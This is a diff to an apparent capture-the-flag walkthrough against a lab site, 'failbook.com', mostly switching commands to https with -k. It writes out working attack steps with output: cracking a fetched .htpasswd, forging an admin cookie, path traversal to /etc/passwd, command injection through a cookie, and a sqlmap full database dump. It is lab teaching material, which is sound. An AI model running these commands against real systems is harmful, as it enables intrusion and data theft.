@@ -16,7 +16,7 @@ Flag 1:
 		Disallow: /admin/*
 		Allow: /
 		
-	$ curk -k "https://failbook.com/admin/"
+	$ curl -k "https://failbook.com/admin/"
 		... 401 Unauthorized ...
 		
 	$ curl -k "https://failbook.com/.htpasswd"
@@ -29,10 +29,10 @@ Flag 1:
 	$ john /tmp/htpasswd --show | head -n 1
 		flaguser:pass123
 		
-	$ curl --user "flaguser:pass123" "https://failbook.com/admin/"
+	$ curl -k --user "flaguser:pass123" "https://failbook.com/admin/"
 		flag.php
 
-	$ curl --user "flaguser:pass123" "https://failbook.com/admin/flag.php"
+	$ curl -k --user "flaguser:pass123" "https://failbook.com/admin/flag.php"
 		... <!-- Flag 1: V2hhdCB3YXMgb25jZSBzZWNyZXQsIGlzIGtub3duIQo= ... --> ...
 
 	$ echo "V2hhdCB3YXMgb25jZSBzZWNyZXQsIGlzIGtub3duIQo=" | base64 -d
@@ -46,19 +46,19 @@ Flag 2:
 	$ curl -k "https://failbook.com/secret.php"
 		Redirected to login.php, So we need to login first
 		
-	$ curl -d "fname=user&lname=name&username=user&password=pass&pconfirm=pass" http://failbook.com/register.php
+	$ curl -k -d "fname=user&lname=name&username=user&password=pass&pconfirm=pass" https://failbook.com/register.php
 		
-	$ curl -c /tmp/cookie.txt -d “username=user&pass=pass” http://failbook.com/login.php
+	$ curl -k -c /tmp/cookie.txt -d “username=user&pass=pass” https://failbook.com/login.php
 		
-	$ curl -b /tmp/cookie.txt http://failbook.com/secret.php
+	$ curl -k -b /tmp/cookie.txt https://failbook.com/secret.php
 		Not Authorized
 
-	$ curl -D /tmp/secret_cookies -d "username=user&password=pass" http://failbook.com/secret.php
+	$ curl -k -D /tmp/secret_cookies -d "username=user&password=pass" https://failbook.com/secret.php
 
 	$ less /tmp/secret_cookies
 		admin=0
 	
-	$ curl -b /tmp/cookie.txt -b "admin=1" https://failbook.com/secret.php
+	$ curl -k -b /tmp/cookie.txt -b "admin=1" https://failbook.com/secret.php
 		... Flag2: U3BlYWsgZnJpZW5kIGFuZCBlbnRlcgo= ...
 		
 	$ echo "U3BlYWsgZnJpZW5kIGFuZCBlbnRlcgo=" | base64 -d
@@ -93,23 +93,23 @@ Flag 3:
 		
 Flag 4:
 
-	$ curl -c /tmp/cookie.txt -d "username=user&pass=pass" http://failbook.com/login.php
+	$ curl -k -c /tmp/cookie.txt -d "username=user&pass=pass" https://failbook.com/login.php
 
-	$ curl -b /tmp/cookie.txt http://failbook.com/test.php
+	$ curl -k -b /tmp/cookie.txt https://failbook.com/test.php
 		Nothing, Maybe Cookies?
 
-	$ curl -b /tmp/cookie.txt -D /tmp/cookie_info.txt http://failbook.com/test.php
+	$ curl -k -b /tmp/cookie.txt -D /tmp/cookie_info.txt https://failbook.com/test.php
 
 	$ cat /tmp/cookie_info.txt
 		... Set-Cookie: TEMPLATE=template.php ...
 
-	$ curl -b /tmp/cookie.txt -b "TEMPLATE=../../../etc/passwd"http://failbook.com/test.php
+	$ curl -k -b /tmp/cookie.txt -b "TEMPLATE=../../../etc/passwd"https://failbook.com/test.php
 		So, we know flag four must be in a file somewhere, but where?
 
 		There are several ways to find the flag four file, even
 		piggybacking on other challenges
 
-	$ curl -b /tmp/cookie.txt -b "TEMPLATE=/var/www2/flag4.txt" http://failbook.com/test.php
+	$ curl -k -b /tmp/cookie.txt -b "TEMPLATE=/var/www2/flag4.txt" https://failbook.com/test.php
 		... Flag 4: VGhhdCB3YXMgZWFzaWVyIHRoYW50IEkgdGhvdWdodC4K ...
 
 	$ echo "VGhhdCB3YXMgZWFzaWVyIHRoYW50IEkgdGhvdWdodC4K" | base64 -d
@@ -117,26 +117,26 @@ Flag 4:
 		
 Flag 5:	
 	
-	$ curl -c /tmp/cookie.txt -d "username=user&pass=pass" http://failbook.com/login.php
+	$ curl -k -c /tmp/cookie.txt -d "username=user&pass=pass" https://failbook.com/login.php
 
-	$ curl -b /tmp/cookie.txt http://failbook.com/cat.php
+	$ curl -k -b /tmp/cookie.txt https://failbook.com/cat.php
 		Nothing too apparent in the output, maybe cookies?
 
-	$ curl -b /tmp/cookie.txt -D /tmp/cookie_info.txt http://failbook.com/cat.php
+	$ curl -k -b /tmp/cookie.txt -D /tmp/cookie_info.txt https://failbook.com/cat.php
 
 	$ cat /tmp/cookie_info.txt
 		... Set-Cookie: command=%2Fbin%2Fbash+%2Fvar%2Fwww%2Fscripts%2Fcat.sh ...
 		
 		Decoded: command=/bin/bash/ /var/www/scripts/cat.sh
 
-	$ curl -b /tmp/cookie.txt -b "command=ls -la" http://failbook.com/cat.php
+	$ curl -k -b /tmp/cookie.txt -b "command=ls -la" https://failbook.com/cat.php
 		... <ls output omitted> ...
 
-	$ curl -b /tmp/cookies.txt -b "command=grep -r 'Flag:' /"
+	$ curl -k -b /tmp/cookies.txt -b "command=grep -r 'Flag:' /"
 		Not ideal, but you can play around with grep and try to find the flags.
 		Once you find the name syntax of flag#.txt, you can try to find those files.
 
-	$ curl -b /tmp/cookie.txt -b "command=/bin/cat /home/failbook/flag5.txt" http://failbook.com/test.php
+	$ curl -k -b /tmp/cookie.txt -b "command=/bin/cat /home/failbook/flag5.txt" https://failbook.com/test.php
 		... Flag 5: WW91IGdvdHRhIGxvdmUgQ29tbWFuZCBJbmplY3Rpb24hCg== ...
 		
 	$ echo "WW91IGdvdHRhIGxvdmUgQ29tbWFuZCBJbmplY3Rpb24hCg==" | base64 -d
@@ -149,13 +149,13 @@ Flag 6:
 	Use Challenge 5 to run, 'ls -la' on the flag directory
 		.flag6.php
 		
-	$ curl -c /tmp/cookie.txt -d "username=user&pass=pass" http://failbook.com/login.php
+	$ curl -k -c /tmp/cookie.txt -d "username=user&pass=pass" https://failbook.com/login.php
 
-	$ curl -b /tmp/cookie.txt http://failbook.com/failbook/.flag6.php
+	$ curl -k -b /tmp/cookie.txt https://failbook.com/failbook/.flag6.php
 		You must connect using 'Failbook v1.0'!
 		Hmm, User Agent?
 
-	$ curl -b /tmp/cookie.txt -A “Failbook v1.0” http://failbook.com/failbook/.flag6.php
+	$ curl -k -b /tmp/cookie.txt -A “Failbook v1.0” https://failbook.com/failbook/.flag6.php
 		Flag 6: TmV2ZXIgZm9yZ2V0IHRoZSBVc2VyIEFnZW50IFN0cmluZwo=
 		
 	$ echo "TmV2ZXIgZm9yZ2V0IHRoZSBVc2VyIEFnZW50IFN0cmluZwo=" | base64 -d
@@ -170,9 +170,9 @@ Flag 7:
 		
 Flag 8:
 
-	$ curl -c /tmp/cookie.txt -d "username=user&pass=pass" http://failbook.com/login.php
+	$ curl -k -c /tmp/cookie.txt -d "username=user&pass=pass" https://failbook.com/login.php
 
-	$ curl -b /tmp/cookie.txt -b "TEMPLATE=../../../etc/passwd" http://failbook.com/test.php
+	$ curl -k -b /tmp/cookie.txt -b "TEMPLATE=../../../etc/passwd" https://failbook.com/test.php
 		... Flag 8: Rmx5LCB5b3UgZm9vbHMuCg== ...
 		
 	$ echo "Rmx5LCB5b3UgZm9vbHMuCg==" | base64 -d
@@ -180,15 +180,15 @@ Flag 8:
 		
 Flag 9:
 
-	$ curl -c /tmp/cookie.txt -d "username=user&pass=pass" http://failbook.com/login.php
+	$ curl -k -c /tmp/cookie.txt -d "username=user&pass=pass" https://failbook.com/login.php
 
-	$ curl -b /tmp/cookie.txt -b "command=md5sum /root/flag9.ssh.key" http://failbook.com/cat.php
+	$ curl -k -b /tmp/cookie.txt -b "command=md5sum /root/flag9.ssh.key" https://failbook.com/cat.php
 		No dice, we are running as the apache user (www-data) and cannot access /root/
 		So now what? Find an exploit and attack the host. Once you do, you’ll get the flag of: e078c4b6febfe1732b9c7c3f7acac4ac
 		
 Flag 10:
 
-	$ sqlmap -u "http://failbook.com/search.php?text=l" --cookie="PHPSESSID=0tauelnjclqhsa7haiunreabu2" --dump-all --risk 3 --level 3
+	$ sqlmap -u "https://failbook.com/search.php?text=l" --cookie="PHPSESSID=0tauelnjclqhsa7haiunreabu2" --dump-all --risk 3 --level 3
 		$ it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
 		$ for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) value? [Y/n] Y
 		$ GET parameter 'text' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
